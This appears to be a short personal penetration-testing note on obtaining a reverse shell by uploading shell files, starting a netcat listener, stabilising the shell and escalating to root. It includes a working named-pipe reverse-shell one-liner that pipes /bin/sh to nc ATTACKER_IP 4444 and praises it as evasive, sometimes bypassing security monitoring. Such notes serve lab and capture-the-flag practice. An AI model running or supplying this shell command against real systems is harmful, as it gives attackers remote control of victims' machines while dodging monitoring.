
- Look for upload buttons to upload reverse shell files 

- Use https://www.revshells.com/ for finding revshells in multiple languages and save them as files for uploading.

- setup a netcat listener 

```
nc -lvnp PORT_NUMBER
```

- Once the revshell connection activates, always stabilise the shell. Check [[python_pty]]

- After gaining a user shell, escalating to higher priveleges & eventually to root is your goal, check [[Privelege Escalation]]

### Reverse Shell over Named Pipe

```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

- **Result:** Creates a stealthy reverse shell using a FIFO pipe.  
- **Hack Value:** More evasive than a plain Bash reverse shell, sometimes bypasses security monitoring.